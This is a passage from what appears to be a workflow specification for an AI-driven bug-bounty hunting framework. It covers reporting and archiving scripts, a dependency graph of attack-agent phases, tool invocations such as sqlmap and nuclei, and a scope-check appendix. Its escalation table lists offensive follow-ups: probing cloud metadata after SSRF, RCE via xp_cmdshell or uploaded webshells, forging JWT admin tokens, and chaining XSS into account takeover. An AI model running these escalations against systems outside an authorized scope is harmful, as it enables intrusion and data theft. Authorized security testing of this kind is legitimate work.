  --mode "$HUNT_MODE" \
  --output ~/Desktop/bounty-report-${TARGET_SLUG}-$(date +%Y%m%d).md

echo "[REPORT] Generated: ~/Desktop/bounty-report-${TARGET_SLUG}-$(date +%Y%m%d).md"
```

### 10.6 Archive Evidence

```bash
# Archive all session artifacts
tar -czf $SESSION_DIR/evidence-archive-$(date +%Y%m%d).tar.gz \
  $SESSION_DIR/findings/ \
  $SESSION_DIR/screenshots/ \
  $SESSION_DIR/artifacts/ \
  2>/dev/null

# Auto-redact credentials from all session logs
bun credential-vault.ts --redact --file "$SESSION_DIR/hunt-events.jsonl"

# Persist to learning database
cat >> ~/.claude/MEMORY/BugBounty/LearningLogs/effective-techniques.md << EOF

## Session: $(date +%Y-%m-%d) -- $TARGET (W_HUNT_WEB)
### Findings: $FINDING_COUNT
### Mode: $HUNT_MODE
### Tech Stack: $(jq -r '.tech_stack | to_entries | map(.key + ":" + (.value | tostring)) | join(", ")' /tmp/app-profile.json)
### Effective Techniques:
$(jq -r '.[] | "- " + .type + " at " + .endpoint + " (CVSS " + (.cvss | tostring) + ")"' $FINDINGS_DIR/all-findings-deduped.json)
EOF
```

### 10.7 Completion Notification

```bash
# Voice notification
curl -s -X POST http://localhost:8888/notify \
  -H "Content-Type: application/json" \
  -d "{\"message\": \"Hunt complete for $TARGET. $FINDING_COUNT findings documented. Report generated.\", \"voice_id\": \"fTtv3eikoepIosk8dTZ5\"}" \
  > /dev/null 2>&1 &

# Update orchestrator state
bun hunt-orchestrator.ts --target "$TARGET" --phase report --status completed \
  --data "{\"finding_count\": $FINDING_COUNT, \"report_path\": \"~/Desktop/bounty-report-${TARGET_SLUG}-$(date +%Y%m%d).md\"}"

# Mark workflow as complete
bun hunt-orchestrator.ts --target "$TARGET" --workflow-complete
```

---

## Workflow Execution Summary

### Phase Dependency Graph

```
Phase 1 (RECON)
  |
  v
Phase 2 (PROFILING)  -- blocks all downstream agents
  |
  v
Phase 3 (AUTH)  -- blocks Phase 5 (access control needs auth tokens)
  |
  +---> Phase 4 (INJECTION)  [4 agents parallel]
  |       |
  +---> Phase 5 (ACCESS CONTROL)  [3 agents parallel, needs Phase 3]
  |       |
  +---> Phase 6 (BUSINESS LOGIC)  [2 agents parallel]
  |       |
  +---> Phase 7 (ADVANCED)  [5 agents parallel]
  |       |
  +---> Phase 8 (PROTOCOLS)  [conditional, up to 3 agents parallel]
  |       |
  +---> Phase 9 (FILE HANDLING)  [conditional, 1 agent]
  |
  v
Phase 10 (REPORTING)  -- waits for all phases to complete
```

**Note:** Phases 4-9 can run in parallel groups after Phase 3 completes, subject to the max concurrent agent limit of 5. The orchestrator schedules batches:

- **Batch A:** Phase 4 (4 agents) -- fills 4 of 5 slots
- **Batch B:** Phase 5 (3 agents) -- after Phase 4 frees slots, needs Phase 3 complete
- **Batch C:** Phase 6 + Phase 7 (7 agents total, batched in groups of 5)
- **Batch D:** Phase 8 + Phase 9 (conditional, up to 4 agents)

### Full Agent Roster

| # | Agent | Phase | Parallel Group | Required | Output File |
|---|-------|-------|----------------|----------|-------------|
| 1 | ReconAgent | 1 | Solo | Yes | `$RECON_DIR/*` |
| 2 | AppReviewAgent | 2 | Solo | Yes | `/tmp/app-profile.json` |
| 3 | AuthAgent | 3 | Solo | Yes | `auth-findings.json` |
| 4 | SQLiAgent | 4 | Injection-A | Yes | `sqli-findings.json` |
| 5 | XSSAgent | 4 | Injection-A | Yes | `xss-findings.json` |
| 6 | XXEAgent | 4 | Injection-A | Yes | `xxe-findings.json` |
| 7 | RCEAgent | 4 | Injection-A | Yes | `rce-findings.json` |
| 8 | IDORAgent | 5 | AccessCtl-B | Yes | `idor-findings.json` |
| 9 | CORSAgent | 5 | AccessCtl-B | Yes | `cors-findings.json` |
| 10 | CSRFAgent | 5 | AccessCtl-B | Yes | `csrf-findings.json` |
| 11 | BusinessLogicAgent | 6 | Logic-C | Yes | `logic-findings.json` |
| 12 | RaceConditionAgent | 6 | Logic-C | Yes | `race-findings.json` |
| 13 | SSRFAgent | 7 | Advanced-C | Yes | `ssrf-findings.json` |
| 14 | CachePoisoningAgent | 7 | Advanced-C | Yes | `cache-findings.json` |
| 15 | HTTPSmugglingAgent | 7 | Advanced-C | Yes | `smuggling-findings.json` |
| 16 | PrototypePollutionAgent | 7 | Advanced-C | Yes | `prototype-findings.json` |
| 17 | SubdomainTakeoverAgent | 7 | Advanced-C | Yes | `takeover-findings.json` |
| 18 | GraphQLAgent | 8 | Protocol-D | Conditional | `graphql-findings.json` |
| 19 | WebSocketAgent | 8 | Protocol-D | Conditional | `websocket-findings.json` |
| 20 | APIAgent | 8 | Protocol-D | Conditional | `api-findings.json` |
| 21 | FileUploadAgent | 9 | FileOps-D | Conditional | `upload-findings.json` |

### Finding-Triggered Escalation Rules

When an agent discovers a vulnerability, the orchestrator triggers additional testing:

| Finding | Escalation Action |
|---------|-------------------|
| IDOR confirmed | Deploy privilege escalation testing across all endpoints |
| SSRF confirmed | Immediately test cloud metadata (169.254.169.254), scan internal ports |
| XSS confirmed (stored) | Test for admin panel impact, chain with ATO payloads |
| Auth bypass confirmed | Re-test all endpoints for missing authorization |
| SQLi confirmed | Attempt data extraction, test for RCE via `xp_cmdshell`/`INTO OUTFILE` |
| File upload bypass | Test for RCE via uploaded webshell |
| JWT none-alg works | Forge admin tokens, test all admin endpoints |
| Race condition confirmed | Test all financial/limit endpoints for double-spend |
| Cache poisoning confirmed | Test for stored XSS via cache, test cache deception for data theft |
| Prototype pollution confirmed | Test for RCE via template engine gadgets (EJS, Pug, Handlebars) |

### Error Handling and Recovery

| Error | Action |
|-------|--------|
| Agent timeout (>15 min) | Kill agent, log partial results, continue workflow |
| Auth session expired mid-phase | Auto-refresh via `auth-manager.ts --refresh`, retry phase |
| Burp proxy unreachable | Log warning, continue without Burp (graceful degradation) |
| Target returns 503/429 (rate limited) | Back off 60s, reduce concurrency, retry |
| Agent crashes | Log error, write empty findings file, continue workflow |
| Disk space low | Archive old findings, compress screenshots, warn operator |
| Phase gate fails hard | Log failure, skip to next phase, note gap in report |

### Tool Reference

| Tool | Invocation | Purpose |
|------|-----------|---------|
| hunt-orchestrator.ts | `bun ~/.claude/skills/BugBountyFramework/Tools/hunt-orchestrator.ts` | State machine, phase tracking |
| credential-vault.ts | `bun ~/.claude/skills/BugBountyFramework/Tools/credential-vault.ts` | Credential storage and redaction |
| auth-manager.ts | `bun ~/.claude/skills/BugBountyFramework/Tools/auth-manager.ts` | Auth flow automation |
| burp-bridge.ts | `bun ~/.claude/skills/BugBountyFramework/Tools/burp-bridge.ts` | Burp Suite integration |
| playwright-harness.ts | `bun ~/.claude/skills/BugBountyFramework/Tools/playwright-harness.ts` | Browser automation |
| subfinder | `subfinder -d $DOMAIN` | Subdomain enumeration |
| assetfinder | `assetfinder --subs-only $DOMAIN` | Subdomain enumeration |
| amass | `amass enum -passive -d $DOMAIN` | Subdomain enumeration |
| naabu | `naabu -list $FILE -top-ports 1000` | Port scanning |
| httpx | `httpx -l $FILE -tech-detect -json` | HTTP probing and fingerprinting |
| katana | `katana -u $URL -d 5 -jc` | Active web crawling |
| ffuf | `ffuf -u $URL/FUZZ -w $WORDLIST` | Directory and parameter brute-force |
| sqlmap | `sqlmap -u $URL --batch` | SQL injection automation |
| dalfox | `dalfox url $URL` | XSS scanning |
| nuclei | `nuclei -l $FILE -severity critical,high` | Vulnerability scanning |
| arjun | `arjun -u $URL` | Hidden parameter discovery |
| subjack | `subjack -w $FILE -ssl` | Subdomain takeover checking |
| interactsh-client | `interactsh-client` | OOB interaction server |

---

## Appendix A: Environment Variables

```bash
# Required
TARGET="https://app.example.com"
TARGET_SLUG="app-example-com"
TARGET_DOMAIN="example.com"
SESSION_COOKIE="session=abc123"
HUNT_MODE="bounty"  # bounty | pentest | comprehensive

# Optional
BURP_PROXY="http://127.0.0.1:8080"
BURP_REST_API="http://127.0.0.1:1337/v0.1"
INTERACTSH_SERVER="your-server.interact.sh"
GITHUB_TOKEN="ghp_..."
PROGRAM_NAME="HackerOne - ExampleCorp"

# Session paths
SESSION_DIR="~/.claude/MEMORY/BugBounty/Sessions/${TARGET_SLUG}"
FINDINGS_DIR="$SESSION_DIR/findings"
EVIDENCE_DIR="$SESSION_DIR/screenshots"
ARTIFACTS_DIR="$SESSION_DIR/artifacts"
RECON_DIR="$SESSION_DIR/recon"
```

## Appendix B: Minimum Viable Run

For a quick assessment (30-60 minutes), run only:

1. Phase 1 (Recon) -- limited to target URL only, skip subdomain enum
2. Phase 2 (Profiling) -- full AppProfile
3. Phase 3 (Auth) -- JWT + session only
4. Phase 4 (Injection) -- SQLi + XSS only (2 agents)
5. Phase 5 (Access Control) -- IDOR only (1 agent)
6. Phase 10 (Report)

```bash
bun hunt-orchestrator.ts --target "$TARGET" --workflow "W_HUNT_WEB" --mode quick
```

## Appendix C: Scope Awareness

Every agent MUST check scope before testing any discovered asset:

```bash
# Before testing any URL discovered during recon or crawling
bun hunt-orchestrator.ts --scope-check "$DISCOVERED_URL"
# Returns: IN_SCOPE or OUT_OF_SCOPE
# OUT_OF_SCOPE assets are logged but NEVER tested
```

Third-party services, CDNs, and shared infrastructure are ALWAYS out of scope unless explicitly listed. When in doubt, do not test.
